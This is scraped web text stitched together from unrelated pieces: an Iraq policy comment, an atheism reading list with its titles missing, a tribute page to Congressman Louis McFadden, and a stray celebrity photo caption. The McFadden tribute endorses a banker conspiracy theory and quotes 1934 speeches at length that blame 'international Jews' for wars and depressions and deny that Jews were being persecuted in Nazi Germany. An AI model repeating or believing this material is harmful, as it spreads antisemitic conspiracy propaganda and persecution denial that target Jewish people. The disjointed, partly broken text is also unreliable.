The Sunni Awakening militias , which the US government trained , armed , and paid to stop fighting the US military , will probably exacerbate the eventual civil war that is likely to occur in a socially - fractured Iraq .
These Awakening forces are now being turned over to a hostile Shi’ite - dominated government , which has already attempted to arrest some of the Awakening leaders and may not give them promised jobs .
These disgruntled Sunni fighters could easily resume the civil war .
If Gates continued to serve in the next administration , he might very well have to deal with the effects of his own sleight of hand .
Gates ’s truthfulness is also limited by the fact that it was concentrated narrowly on military procurement and ( the lack of counterinsurgency ) doctrine .
What Gates should have said was that the historical record indicates that military invasion by a foreign power rarely changes deep - rooted political , economic , social , and cultural norms in the target of the attempted " nation - building "  usually rendering such armed adventures pure folly .

This is one of the ways readers can support Atheist Revolution .
One question frequently asked by those just discovering atheism is , " What books would you recommend to someone just beginning to explore atheism ? "
Not only is this an excellent question , but it is one I remember wanting desperately to ask at one point in my life .
Unfortunately , I could not find anyone to ask .
I am happy to see this question around the atheist blogosphere , as it shows me that times have indeed changed with regard to the availability of atheists and information about atheism .
In this post , I 'll provide a reading list to get you started .
I recognize that everyone 's needs will be different , so I am not going to simply provide a list of books and instruct you to read them .
Instead , I am going to explain what you will find in each book and make some suggestions about the order in which to read them .
Your time and resources may be limited , so my goal is for you to have enough information to choose wisely .
Where to Start
In learning about any new phenomenon , it is helpful to begin by understanding why the object of one 's study is important .
Atheism is no different in this regard .
I recommend starting with a book that will both provide a decent overview of the subject matter and help the reader understand the perils of religious belief .
Thus , I suggest beginning with one of the following books :
If I was to pick one of these , it would be The End of Faith , but both are worth reading .
For the reader who has already read one or both of these and is seeking a broad overview of atheism , check out Atheist Universe : The Thinking Person 's Answer to Christian Fundamentalism .
Philosophical Atheism
Some of the best writing on atheism comes from the philosophers , and indeed , most well - rounded atheists will be familiar with many of the philosophical arguments for and against theism .
This domain is a great one to explore next .
There are many excellent places to start , and nearly any text in the philosophy of religion will be worthwhile .
However , I do have a couple favorites in this domain , both of which are very easy to recommend :
Scientific Atheism
Not everyone enjoys reading scientific books , and not all atheists will want to delve far into the scientific arguments against religion .
However , there is one book from this domain that I strongly recommend to all readers , including those without any science background whatsoever :
Carl Sagan was gifted at promoting science to lay audiences , and this outstanding book demonstrates the beauty of science as a means of understanding our world as well as any other I have encountered .
History of Atheism and Freethought in America
Precious little is new about the " new atheism " with which the mainstream media was recently obsessed .
Nonbelievers were making important contributions long before Harris , Dawkins , and Hitchens were born .
Even in the so - called " Christian nation " of America , many influential atheists had a critical role in history .
Society , Culture , and Politics
Given the widespread bigotry faced by atheists from believers , no introduction to atheism is complete without addressing the social , cultural , and political context in which we find ourselves .
There are so many excellent books to recommend in this area , but I will limit myself to these three :
This should be plenty to permit a reasonably thorough exploration of this broad domain , even though it takes every ounce of self - control I can muster not to recommend many more .
Once again , this reading list is designed for persons wanting to learn about atheism and in the early stages of their exploration of atheism .
Here is a follow - up post in which I provide additional suggestions in these domains for the intermediate to advanced atheists wanting to explore one or more domain in depth .
The Greatest Hoax
A tribute to Congressman Louis Thomas McFadden
( scroll down for excerpts of important speeches )
Louis Thomas McFadden was born in Troy , Bradford County , Pennsylvania on October 1 , 1876 .
He attended public schools and a commercial college .
At sixteen he took a job as office boy in the First National Bank in Canton , Pennsylvania , a small town near his birthplace .
Seven years later he was a cashier , and in 1916 he became the president of the bank .
Meanwhile , in 1898 he had married Helen Westgate of Canton , by whom he had three children : two sons and one daughter .
His political career began in 1914 when he was elected to Congress as Republican representative from the 15th district .
In 1920 , he was appointed chairman of the influential House committee on Banking and Currency , a position he held until 1931 .
McFadden 's later career was marked by violent criticism of his party 's financial policies .
Opposition to the Hoover moratorium on war debts led him to propose to the House on 12 -13-1932 that the President be impeached .
He bitterly attacked the governors of the Federal Reserve Board for " having caused the greatest depression we have ever known " .
Both the President and the Board , he was convinced , were conspiring with the " international " bankers to ruin the country .
He l ost his seat to a Democrat in 1934 , although two years previously he had had the support of the Republican , Democratic and Prohibition parties .
He died in 1936 while on a visit in new York City .
Congressman McFadden , born in the heartland of America , a true product of its original and unadulterated self , and because of that heritage he could do no else but battle for the land which he loved .
And battle he did .
Armed with the courage of his convictions and the certitude of his cause he hurled his thundering charges against those who were plundering America and drenching the world in blood with their insane greed .
McFadden refused obeissance to the high priests of Mammon , the International Bankers , for whom he reserved the full force of his attacks .
The enormity of his revealments against the Federal Reserve Board and the Federal Reserve Banks will stagger the credibility of the reader .
The din of the battle being waged by Congressman McFadden against his opponents reverberated not only in the halls of Congress but throughout the Capitol .
The dean of Washington newspapermen at that time and founder of the National Press Club , Mr. George Stimpson , when asked in later years to comment on the seriousness and magnitude of the charges being made by McFadden , he replied , " It was incredible .
This town went into a state of shock .
We could n't believe what we were hearing .
Of course , they said right away that he had lost his mind . "
" Do you think he had ? " , Stimpson was asked .
" Oh , no , " came the reply .
" But it was too much , too much for one man to do " .
It was too much for one man to do , and this proved his heroism .
It speaks volumes for the courage and character of Louis T. McFadden that he made these speeches knowing that there was no support ; that there would be no support .
Was it too quixotic of him ?
Should he have waited , quietly gathering his information until it could have been put to more practical use ?
But why was there no support ?
We must remember that when McFadden made these speeches we were in the darkest days of the Great Depression , when the nation was prostrate , and in the dark night of the soul of the American people .
A sad and defeated nation , destroyed from within , brought to its knees , could offer no help when McFadden opened every door , named every name , exposing every secret of the underground government .
How could any American youth fail to be moved by the spectacle of a small town banker rising to the leadership of our Congressional Committee on Banking and Currency , and , in that capacity , refusing to be bought by those who buy and sell men like cattle ?
Instead , he nearly brought to a halt the vast and intricate machinations of international bankers and their sinister schemes to attain perpetual and limitless wealth at the expense of an enslaved , drugged and brainwashed population of drone workers .
For twenty years he fought our fight , while we knew little or nothing of his efforts , and when he died , seemingly the record of that struggle was buried with him .
Now we bring it to light , every word faithfully reproduced from the Congressional Record , not only to enshrine his memory in our hearts , but also to give us a standard to which we can rally .
We can no longer endure the pitiful half - men , half - women , posturing on the slave block in their efforts to present their best side to the sneering slave - dealers , and we do not refer here to some mythical beings , but rather to the so - called public representatives , the men who have inherited Louis McFadden 's mantle in the Congress of the United States .
These men are a poor bargain even for their masters , and even less a bargain are they for us .
Let us demand from them the heroism , the self - sacrifice , the patriotism which Louis T. McFadden gave us without our asking for it .
And if they do not have it to give , then sweep them out .
Do we dare to admit that everything which has happened to America since the Whiskey Rebellion has been the result of foreign influences , of alien conspiracies carried out through fetid and subterranean corridors of power , the work of the government that dares not speak its name ?
The Civil War , World War I , the Great Depression , World War II ... these were events which were not desired by the american people .
They were not planned by the American people .
They were not voluntarily entered into by the American people .
But all of these events were the result of the planning of men who have no addresses , no fixed homes , no substantial loyalties save only to their own criminal interests .
These are men who in healthier times were sent to the gibbet , but today we make them presidents of our banks and universities , and we watch appalled at the chaos and destruction which ensures from their every act .
Let us remember that for ten years , Congressman McFadden had been Chairman of the House Banking and Currency Committee .
While exercising the duties of this position he exposed some of the greatest crimes of the century , including his stinging indictment of the Board of Governors of the Federal Reserve System in which he charged them " with having treasonably conspired to destroy constitutional government in the United States " .
Because of these exposures , Louis T. McFadden had unleashed the full power of the international criminals against him .
when he made these speeches , he was alone .
He had nothing to look forward to save his own political demise .
The power and pelf of his enemies was brought to bear and the political life of this great servant of the people was terminated in the November 1934 elections held in the 15th Congressional District of Pennsylvania .
Thus these speeches are the personal signature of a great man , a hero fighting to the death , surrounded but never thinking of surrender , the final gesture of a man we should all honor and emulate , an American worthy of the name .
Note :
You 've just read the introduction of a 500 page book on the collected Congressional speeches of Congressman McFadden , available at Emissary Publications .
Also , the Omni Christian Book Club carries a sixty - page paperback of his speeches from 1932 - 1934 .
See Resources for further information .
We 've read in other sources that he did not die of natural causes .
Here are some excerpts that give us a just a hint of the courage demonstrated by Mr. McFadden .
From these , it 's clear he realized the evil beings who gained control of the government , elected officials , and our ' monetary system ' had ( have ) total disregard for human lives ... including his .

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Congressional Record : January 8 , 1934 :
Congressman McFadden : " The Congress of the United States must immediately throw the searchlight of investigation into this dark corner , or we are going to be swamped with political influences that are manufactured in foreign countries and that will lead us to the surrender of our heritage of living , just as has been done on former occasions .
Just as we did , for example , when we entered into the Jay Treaty with England , which was ratified on June 24 , 1795 , whereby we needlessly surrendered our right to the freedom of the seas .
We fought the War of 1812 to regain this right , but the same political influences prevented even a discussion of this subject at the treaty which terminated that war .
President Wilson vowed to regain the freedom of the seas at the Treaty of Versailles ; but did we regain it ?
Is the Jay Treaty still in force ?.... "
" I stand here and say to you that I have studied these records , and not only did we adopt this monetary policy without debate , not only did we adopt it without consideration but we adopted it without even knowledge of what we were doing !
It was a piece of legislative trickery ; it was a piece of work in the committee that was silent and secretive .
Even members of the committee did not know what was being done , according to their own declarations .
The President and Members of the House did not know they were acting on such a measure .
But , as I have said before , the shadow of the hand of England rests over this enactment . "
( C R , January 8 , 1934 )
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Congressional Record : January 8 , 1934
Congressman Fiesinger : " You will recall the gentleman spoke about Professor Sprague , who was in the Treasury Department as adviser to the Treasury after he came as adviser for the Bank of England .
He was also monetary adviser to the Economic Conference in London . "
Congressman Fiesinger : " I was just going to remark that very thing , that the power to " coin and fix the value of money " is solely within the power of the Congress of the United States and it cannot be delegated to anybody else in the world . "
Congressman McFadden : " Will the gentleman yield further ? "
Congressman Fiesinger : " I do . "
Congressman McFadden : " What does the gentleman say in regard to the delegation of that power to the Federal Reserve System ? "
Congressman Fiesinger : " I say it is illegal .
I say it is unconstitutional , as far as it affects the value of basic money .
Power to control credits may be in a different class . "
Congressman McFadden : " The gentleman recognizes that that was done , does he not ? "
Congressman Fiesinger : " Well , I think I recognize that fact ; but it may be that Congress intended to delegate banking and credit control and not the control of the basic money values . "
Congressman McFadden : " The Federal Reserve System has the power to issue Federal Reserve notes , which circulate as money ? "
Congressman Fiesinger : " It has .
Of course , they are promises to pay .
They are credits or IOU 's of the bank . "
Congressman McFadden : " And that power was delegated by Congress in the Federal Reserve Act . "
Congressman Fiesinger : " Yes , sir ; with the intent to regulate the volume of credit . "
Congressman McFadden : " And is being pursued by them , which gives the Federal Reserve System control over the money and credit in the United States . " ....
Congressman Mott : " What does the gentleman say about the delegation by Congress to the President to fix the value of money , under the farm bill ? "
Congressman Fiesinger : " I think it was illegal , and the President did not want it .
It was forced upon him .
He never asked to have the amendment attached to the farm bill .
It was forced upon him , and he is exercising the power because he was forced to exercise it ; a power that he never wanted , and I say it is all illegal and unconstitutional . "
Congressman McFadden : " If the gentleman has been familiar with the activities of Dr. Sprague over the history of the Federal Reserve System , he well knows that Dr. Sprague has been in all of the conferences , practically , between the Bank of England , officers of the Federal Reserve bank in New York and other central banks , which have had for their purpose the dealing with national and international price levels .
That was one of the functions that he was exercising as expert adviser of the Bank of England . "
Congressman Fiesinger : " Now , I understand that Dr. Sprague at the London conference was willing to peg the dollar to the British pound at $ 3.50 , and , if he had done that , the price levels in America would have been in the control of the Bank of England , and it would have been so low it would have wrecked our national economy .

Congressman Lamneck : " Will the gentleman please insert at this point what Dr. Sprague said about who should control the price level ? "
Congressman Fiesinger : " I may say - I did not expect to answer that question , but Dr. Sprague , in a conference he had , stated he believed that the value of gold should be controlled by the British , because they were more competent , from banking experience , so to do . "

Congressman McFadden : " I am quoting from the President 's message to Congress on this very measure .
I quote :
" That the title of all gold be in the Government .
The total stock will serve as a permanent and fixed metallic reserve which will change in amount only as far as necessary for the settlement of international balances or as may be required by future agreement among nations of the world for a redistribution of the world stock of monetary gold . "
Congressman McFadden : " I say again what I have repeatedly said , that there is a definite plan for the redistribution of the gold of this country and of the world 's gold .
The plan has been known ever since the establishment of the Bank for International Settlements that through that medium , or one similar to it , eventually the redistribution of gold would take place . "

Congressman McFadden : " Why should the United States be buying gold and paying $ 35 an ounce for it ?
Why Should the United States be making Great Britain a present of $ 14.33 an ounce on the hundreds of millions of dollars of British gold that is being shipped to the United States through this process be favoring four London gold brokers ?
Why should the United States set a price of $ 35 and pay Great Britain an increase of $ 14.33 on every ounce of gold ?
This is interesting when you consider that three fourths of all the gold produced in the world is produced in the British Empire .
Did we do this because Great Britain demanded it ?
Is it possible that this $ 14.33 profit to Great Britain on every ounce of gold shipped into the United States is for settlement of a debt that the United States owes to Great Britain ?

Congressman Weideman : " So the paramount issue of today is this : Shall the Government of the United States be run for the benefit of the international bankers or shall the citizens of the United States be given the right to ' life , liberty , and the pursuit of happiness ' ?
Shall we replace the Statue of Liberty with the golden statue erected to the god of greed ?
Shall we forget that the only time our Saviour used force was when he drove the money changers from the temple ?
Let us reestablish the principle that we all believe in :
That all men are entitled to a right to work , to own their own homes , to reap a just reward for their labors , and to enjoy nature 's sunshine as God intended .
We owe it to our children that we shall not depart and leave them in a condition of bondage and slavery to organized greed and gold . "
Congressman Lemke : " .... This nation is bankrupt ; every State in this Union is bankrupt ; the people of the United States , as a whole , are bankrupt .
The public and private debts of this Nation , which are evidenced by bonds , mortgages , notes , or other written instruments amount to about $ 250,000,000,000 , and it is estimated that there is about $ 50,000,000,000 of which there is no record , making in all about $ 300,000,000,000 of public and private debts .
The total physical cash value of all the property in the United States is now estimated at about $ 70,000,000,000 .
That is more than it would bring if sold at public auction .
In this we do not include debts or the evidence of debts , such as bonds , mortgages , and so forth .
These are not physical property .
They will have to be paid out of the physical property .
How are we going to pay $ 300,000,000,000 with only $ 70,000,000,000 ? " ( CR , 3 - 3-1934 )

Congressional Record , March 15 , 1934
Congressman McFadden : " It is right in line with the plan which is now being worked out in England .
I want to point out to the House that there is a concerted movement not only in England but in the United States .
In the United States this movement is in charge of certain men now engaged in writing legislation in Department of Agriculture .
I refer to Mr. Tugwell , Mr. Mordecai Ezekiel , and Mr. Frank , and their immediate associates , some of whom are in other departments and some of whom are outside ; and I may even go so far as to say that they are aided and abetted in this matter apparently by the Secretary of Agriculture .
Their action in this matter is also assisted and aided through the agency of the Foreign Policy Association of the United States , which is directly connected with the Fabian Society , or a branch of it , in England , which at the present time is attempting to take over the control of agriculture and its operation in England , as well as the industries therein located .
I call your especial attention to the recent article , America Must Choose , by Secretary of Agriculture Wallace , a syndicated article put out under the auspices of the Foreign Policy Association of New York and copyrighted by them .
This article is quite in keeping with the plan of the British offspring of the Fabian group .
One of the stalwarts against the move in England is Stanley Baldwin .
Mr. Baldwin issued a statement which was printed in the United States recently .
It was a statement made over the radio , and , if I have time , I will read it to you , because he is standing today against the movement in England that I am speaking against now , and that movement is evidenced by this legislation and any other kind of legislation following , which have for their purpose the regimenting of all production in the United States , leading up to an absolute dictatorship .
The quotation I refer to from Mr. Baldwin is as follows :
" Our freedom did not drop down like manna from heaven .
It has been fought for from the beginning of our history and the blood of men has been shed to obtain it .
It is the result of centuries of resistance to the power of the executive and it has brought us equal justice , trial by jury , freedom of worship , and freedom of religious and political opinion .
Democracy is far the most difficult form of government because it requires for perfect functioning the participation of everybody .
" Democracy wants constant guarding , and for us to turn to a dictatorship would be an act of consummate cowardice , of surrender , of confession that our strength and courage alike had gone .
It is quite true the wheels of our state coach may be creaking in heavy ground , but are you sure the wheels of the coach are not creaking in Moscow , Berlin , and Vienna , and even in the United States ? "
The whole tendency of a dictatorship is to squeeze out the competent and independent man and create a hierarchy accustomed to obeying .
Chaos often results when the original dictator goes .
The rise of communism or fascism - both alike believe in force as a means of establishing their dictatorship -- would kill everything that had been grown by our people for the last 800 or 1,000 years . "
The plan in England to which I am referring is the " political economic plan " , drawn up by Israel Moses Sief , the director of a chain - store enterprise in England called Marks & Spencer .
This enterprise declared a dividend of 40 percent for 1933 , and was enabled to do so by the fact that it has until now handled almost exclusively all imports from Soviet Russia , which has enabled this house to undersell competitors .....
The political economic plan is in operation in the British Government by the means of a tariff advisory board .
This organization has gathered all data and statistics obtained by governmental and private organization in administrative , industrial , trade , social , educational , agricultural , and other circles .
Air - force statistics are in their hands , as well as those of the law and medical professions .
this organization or group have had access to all archives of the British Government , just as the ' brain trust ' here in the United States have had access to archives of our Government departments .
Through the tariff advisory board , which was created in February of 1933 , and headed by Sir George May , the control of industry and trade is being firmly established in the British Empire .
This tariff advisory board works in direct connection with the Treasury , and together with it devises the tariff policy .
In this bill and the tariff bill which follows it is proposed to set up just such a board , under the direction of the President , as the tariff advisory board of England .
The tariff board in England has been granted the powers of a law court and can exact under oath that all information concerning industry and trade be given it .
Iron and steel , as also cotton and industrials , in England have been ordered by the tariff advisory board to prepare and submit plans for the reorganization of their industries and warned that should they fail to do so , a plan for complete reconstruction would be imposed upon them .
May I suggest to you the similarity of this plan with the N.R.A. , and also suggest to you that the tariff advisory board in England has been granted default powers and can , therefore , impose its plan .
The tariff board is composed , in addition to Sir George May , of Sir Sidney Chapman , professor of economics and statistics , and Sir George Allen Powell , of the British Food Board and Food Council .
And it is a well - known fact that this particular political economic group has close connection with the Foreign Policy Association in New York .
I wish to quote from a letter from a correspondent of mine abroad , as follows :
" It appears that the alleged ' brain trust ' is supposed to greatly influence the present United States policy .
Neither you nor I are particularly interested in what takes place in England , but what should interest us both , it seems to me , is that there is a strong possibility that certain members of the ' brain trust ' around our President are undoubtedly in touch with this British organization and possibly are working to introduce a similar plan in the United States .
" I understand the brain trust ' is largely composed of Professor Frankfurter , Professor Moley , Professor Tugwell , Adolph Berle , William C. Bullitt and the mysterious Mordecai Ezekiel .
" I think there is no doubt that these men all belong to this particular organization with distinct Bolshevik tendencies .
So it is quite possible that should this political economic plan be developed in the United States , if this alleged ' brain trust ' has really a serious influence over the judgment of our President , this plan may be attempted in our country . "
Need I point out to you , who have been observing the activities of the so - called ' brain trust ' in the writing and sending to the Congress of legislation , that this legislation has for its purpose the virtual setting up in the United States of a plan similar to that which is being worked out in England .
I am assured by serious people who are in a position to know that this organization practically controls the British Government , and it is the opinion of those who do know that this highly organized and well - financed movement is intended to practically Sovietize the English - speaking race .
I wish to quote again from my correspondent , as follows :
Some two months ago when Israel Moses Sieff , the present head of this organization , was urged to show more activity by the members of his committee , he said , " Let us go slowly for a while and wait until we see how our plan carries out in America . "

Congressional Record , April 9 , 1934
Congressman Patman : " .... A Federal Reserve bank has a great privilege .
It has the right to issue a blanket mortgage on all the property of all the people of this country .
It is called a Federal Reserve note .
For that privilege section 16 of the act provides that when the Government prints a Federal Reserve note and guarantees to pay that note and delivers it to a Federal Reserve bank , that Federal Reserve bank shall pay -- it seems to be mandatory -- the rate of interest that is set by the Federal Reserve Board .
The law has never been put into effect .
The Federal Reserve Board sets the zero rate .
Instead of charging an interest rate which the law says they shall charge , they set no rate at all .
Therefore , for the use of this great Government credit , these blanket mortgages that are issued against all the property of all the people of this Nation and against the incomes of all the people of this Nation , they do not pay one penny .
Not one penny of the stack of the Federal Reserve banks is owned by the Government or the people , but it is owned by private banks exclusively .
They do not pay one penny for the use of that great privilege , to the people or to the Government .

Congressional Record , June 14 , 1934 Congressman McFadden : " I hope that is the case , but I may say to the gentleman that during the sessions of this Economic Conference in London there is another meeting taking place in London .
We were advised by reports from London last Sunday of the arrival of George L. Harrison , Governor of the Federal Reserve Bank of New York , and we were advised that accompanying him was Mr. Crane , the Deputy Governor , and James P. Warburg , of the Kuhn - Loeb banking family , of New York and Hamburg , Germany , and also Mr. O. M. W. Sprague , recently in the pay of Great Britain as chief economic and financial adviser of Mr. Norman , Governor of the Bank Of England , and now supposed to represent our Treasury .
These men landed in England and rushed to the Bank of England for private conference , taking their luggage with them , before even going to their hotel .
We know this conference has been taking place for the past 3 days behind closed doors in the Bank of England with these gentlemen meeting with heads of the Bank of England and the Bank for International Settlements , of Basel , Switzerland , and the head of the Bank France , Mr. Maret .
They are discussing war debts ; they are discussing stabilization of exchanges and the Federal Reserve System , I may say to the Members of the House .
The Federal reserve System , headed by George L. Harrison , is our premier , who is dealing with debts behind the closed doors of the Bank of England ; and the United States Treasury is there , represented by O. M. W. Sprague , who until the last 10 days was the representative of the Bank of England , and by Mr. James P. Warburg , who is the son of the principal author of the federal Reserve Act .
Many things are being settled behind the closed doors of the Bank of England by this group .
No doubt this group were pleased to hear that yesterday the Congress passed amendments to the Federal Reserve Act and that the President signed the bill which turns over to the Federal Reserve System the complete total financial resources of money and credit in the United States .
Apparently the domination and control of the international banking group is being strengthened ....
We are being led by the international Jews operating through Great Britain and the Bank of England , and it is the purpose of those who are directing and cooperating that debts be reduced to 10 percent or canceled entirely ....
Then there is James P. Warburg , who was called in by the President and who has sat in on all of the conferences here in Washington participated in by the foreign representatives recently , and he is the financial adviser at the Economic Conference and at the conferences in the Bank of England to which I have referred .
Mr. Warburg , you undoubtedly know , is the head of the international Jewish financial group who were largely responsible for the loaning abroad of the vast billions of dollars by the people of the United States and which loans are now frozen .
We must not overlook the fact , however , that J. P. Morgan & Co. were close seconds in these transactions , and in connection with this I wish to point out that George L. Harrison , Governor of the Federal Reserve Bank of New York , is closely identified with the Morgan House in all of the undertakings internationally in which the Federal Reserve banks participated .

Congressional Record : June 15 , 1934 Congressman McFadden : " At that time a man named Jacob Schiff came to this country as the agent of certain foreign money lenders .
His mission was to get control of American railroads .
This man was a Jew .
He was the son of a rabbi .
He was born in one of the Rothschilds 's houses in Frankfort , Germany .
He was a small fellow with a pleasant face and , if I remember correctly , his eyes were blue .
At an early age he set out from Frankfort to seek his fortune and went to Hamburg , Germany .
At Hamburg he entered the Warburg banking establishment .
The Warburgs of Hamburg are bankers of long standing , with branches in Amsterdam and Sweden .....
Sometime before Schiff 's arrival there was a firm of Jewish peddlers or merchants in Lafayette , Ind. , by the name of Kuhn & Loeb .
I think they were there about 1850 .
Probably they made money out of the new settlers who passed through Indiana on their way to the Northwest .
This firm of Jews had finally moved to New York and had set themselves up as private bankers and had grown rich .
Jacob Schiff married Teresa Loeb and became the head of Kuhn , Loeb & Co. Schiff made a great deal of money here for himself and for the Jewish money lenders of London .
he began to give orders to Presidents almost as a matter of course .
He appears to have been a man who would stop at nothing to gain his own ends .
I do not blame him for being a Jew .
I blame him for being a trouble maker .
Russia had a powerful enemy in this man , Jacob Schiff .
The people of the United States were to believe that this enmity of his was caused by wrongs done to Russian Jews .
I look elsewhere for the motives which animated him .
In the 1890's Schiff was the agent in this country of Ernest Cassell and other London money lenders .
These money lenders were looking forward to a war between England and Russia and were making preparations for propaganda designed to support England in the United States .
This country was then a debtor nation , paying a high yearly tribute to Schiff and his principals .
Schiff accordingly took it upon himself to create a prejudice in the United States against Russia .
He did this by presenting the supposed wrongs of the Russian Jews to the American public .
Unpleasant tales began to appear in print .
School children in this country were told the Jewish children were crippled for life by Russian soldiers wielding the knout .
By unfair means a wedge was driven between Russia and the United States .
One of Schiff 's schemes was a sort of wholesale importation of Russian Jews into the United States .
He drew up divers and sundry regulations for the temporary transplantation of these Jewish emigrants .
He would not , he said , have them enter this country through the port of New York , because they might like New York too well to leave it for the outposts he had selected for them .
He said it would be best to have them come in at New Orleans and to have them stay there two weeks , " so that they could pick up a few words of English and get a little money " before setting off for what he called the " American hinterland . "
How they were to get the money he did not say .
Aided by Schiff and his associates , many Russian Jews came to this country about that time and were naturalized here .
A number of these naturalized Jews then returned to Russia .
Upon their return to that country , they immediately claimed exemption there from the regulations of domicile imposed on Jews ; that is , they claimed the right to live on purely Russian soil because they were American citizens , or " Yankee " Jews .
Disorders occurred and were exploited in the American press .
Riots and bombings and assassinations , for which somebody furnished money , took place .
The perpetrators of these outrages appear to have been shielded by powerful financial interests .
While this was going on in Russia , a shameless campaign of lying was conducted here , and large sums of money were spent to make the general American public believe that the Jews in Russia were a simple and guileless folk ground down by the Russians and needing the protection of the great benefactor , of all the world - Uncle Sam .
In other words , we were deceived .
We were so deceived that we allowed them to come in here and to take the bread out of the mouths of our own American citizens .
I come now to the time when war was declared between Russia and Japan .
This was bought about by a skillful use of Japan so that England would not have to fight Russia in India .
It was cheaper and more convenient for England to have Japan fight Russia than to do it herself .
As was to be expected , Schiff and his London associates financed Japan .
They drew immense quantities of money out of the United States for that purpose .
The background for the loans they floated in this country had been skillfully prepared .
The " sob stuff " , of which Schiff was a master , had sunk into the hearts of sympathetic Americans .
The loans were a great success .
Millions of American dollars were sent to Japan by Schiff and his London associates .
England 's stranglehold on India was made secure .
Russia was prevented form entering the Khyber Pass and falling on India from the northwest .
Japan at the same time was built up and became a great world power , and as such is now facing us in the Pacific .
All this was accomplished by control of the organs of American publicity , releases to the effect that Russian Jews and " Yankee " Jews were being persecuted in Russia , and by the selling of Japanese war bonds to American citizens .
While the Russo - Japanese War was in progress President Theodore Roosevelt offered to act as peacemaker , and a conference between representatives of the belligerents was arranged to take place at Portsmouth , N.H .
When the Portsmouth Conference took place , Jacob Schiff attended it and used such influence as he had with Theodore Roosevelt to win favors for Japan at the expense of Russia .
His main object , then as always , was humiliation of Russians , whose only crime was that they were Russians and not Jews .
He endeavored to humiliate the Russians , but Count Witte , the Russian plenipotentiary , did not allow him to succeed in this attempt .
Schiff 's power and the power of his organized propaganda were well understood by Count Witte , however .
Consequently he was not surprised when President Roosevelt , who was often deceived , twice asked him to have Russia treat Russian Jews who had become naturalized in the United States and who had thereafter returned to live in Russia with special consideration ; that is , not as Jews but as Americans .
Witte carried home a letter from Roosevelt embodying this plea .
Mr. Speaker , the restrictions upon Jews in Russia at that time may or may not have been onerous .
But onerous or not , before the Russians had time to change them , Schiff had the 80 - year - old - treaty of friendship and good will between Russia and the United States denounced .
Speaking of this matter , Count Witte says in his autobiography : " The Russians lost the friendship of the American people . "
Mr. Speaker , I cannot believe that those people -- the real Russians -- ever lost the true friendship of the American people .
They were done away with to suit the ambitions of those who intend to be the financial masters of the world , and some of us were deceived into thinking that in some mysterious way they , themselves , were to blame .
The chasm that suddenly opened between ourselves and our old friends and well - wishers in Russia was a chasm created by Schiff the vindictive in his inhuman greed , and he created it in the name of the Jewish religion ....
Mr. Speaker , the people of the United States should not permit financial interests or any other special interests to dictate the foreign policy of the United States Government .
But in this connection history is now repeating itself .
You have heard , no doubt , of the so - called persecutions of Jews in Germany .
Mr. Speaker , there is no real persecution of Jews in Germany .
Hitler and the Warburgs , the Mendelssohns and the Rothschilds , appear to be on the best of terms .
There is no real persecution of the Jews in Germany , but there has been a pretended persecution of them because there are 200,000 unwanted Communistic Jews in Germany , largely Galician Jews who entered Germany after the World War , and Germany is very anxious to get rid of those particular Communistic Jews .
The Germans wish to preserve the purity of their own blond racial stock .
They are willing to keep rich Jews like Max Warburg and Franz Mendelssohns , whose families have lived in Germany so long that they have acquired some German national characteristics .
But the Germans are not willing to keep the Galician Jews , the Upstarts .
So a great show is put on , largely by German Jews themselves , in the hope that Uncle Sam will prove himself to be as foolish as he was before and that we will allow those Galician and Communistic Jews to come in here .
That is why Miss Perking has been placed in charge of the Department of Labor .
She is there to lower the immigration bars .
It is thought that , being a woman , she may disarm criticism .
She is and old hand with the international Jewish bankers .
If she were not , she would not be here in a Jewish - controlled administration .
When the so - called " anti-Semitic campaign " designed for American consumption was launched in Germany , France was alarmed because she feared the Galician Jews might be dumped on French soil .
French newspapers published articles concerning the menace , but now that France has been shown that the purpose of the anti-Semitic campaign is to dump the 200,000 communistic Jews on the United States she is worried no longer .
" Ah " , she says , " Ol ' Uncle Sam , he is to be the goat .
Very good . "
Mr. Speaker , I regard it as a pity that there are Americans who love to fawn upon the money Jews and to flatter them .
Some of these unfortunates are under obligations to Jewish money changers and dare not cross them ....
You have witnessed the unlawful seizure by Franklin D. Roosevelt of gold reserves and other values belonging to the people of the United States , the destruction of banks , the attempted whitewashing of the Federal Reserve Board and Federal Reserve banks , the corruption of which he admitted in his campaign harangues ; and you may have noticed that what was confiscated is not in the hands of the present constitutional Government but in the hands of the international bankers who are the nucleus of the new government Roosevelt is seeking to establish here .
Roosevelt 's actions are not in accordance with the Constitution of the United States .
They are in accordance with the plans of the Third International .
At one time Trotzky was a favorite with Jacob Schiff .
During the war Trotzky edited Novy Mir and conducted mass meetings in New York .
When he left the United States to return to Russia , he is said upon good authority to have traveled on Schiff 's money and under Schiff 's protection .
He was captured by the British at Halifax and immediately , on advice from a highly placed personage , set free .
Shortly after his arrival in Russia he was informed that he had credit in Sweden at the Swedish branch of the bank owned by Max Warburg , of Hamburg .
This credit helped to finance the seizure of the Russian revolution by the international Jewish bankers .
It assisted them in subverting it to their own ends .
At the present time the Soviet Union is in debt .
From the date of Trotzky 's return to Russia the course of Russian history has , indeed , been greatly affected by the operations of international bankers .
They have acted through German and English institutions and have kept Russia in bondage to themselves .
Their relatives in Germany have drawn immense sums of money from the United States and have in turn financed their agents in Russia at a handsome profit .
The Soviet Government has been given United States Treasury funds by the Federal Reserve banks acting through the Chase Bank and the Guaranty Trust Co. and other banks in New York City .
England , no less than Germany , has drown money from us through the Federal Reserve banks and has re-lent it at high rates of interest to the Soviet Government or has used it to finance her sales to Soviet Russia and her engineering works within the Russian boundaries .
The Dnieperstroy Dam was built with funds unlawfully taken from the United States Treasury by the corrupt and dishonest Federal Reserve Board and the Federal Reserve banks ....
Mr. Speaker , an immense amount of United States money has been used abroad in preparations for war and in the acquisition and the manufacture of war supplies .
Germany is said to be part owner of a large poison - gas factory at Troitsk on Russian soil .
China is almost completely Sovietized , and in the Asiatic interior huge stocks of munitions are said to be stored awaiting the day when the war lords of the United States will ship United States troops to Asia .
Mr. Speaker , the United States should look before it leaps into another war , especially a war in Asia .
It should decide whether it is worth while to join hands with Russia and China in a war against Japan .
For myself , I say and I have said it often that the United States should remember George Washington 's advice .
It should mind its own business and stay home .
It should not permit the Jewish international bankers to drive it into another war so that they and their Gentile fronts and sycophants by way of Louis McHenry Howe , the graftmaster , may reap rich profits on everything an army needs from toilet kits to airplanes , submarines , tanks gas masks , poison gas , ammunition , bayonets , guns , and other paraphernalia and instruments of destruction .

David Beckham Go3 Healthy Food Range Photos
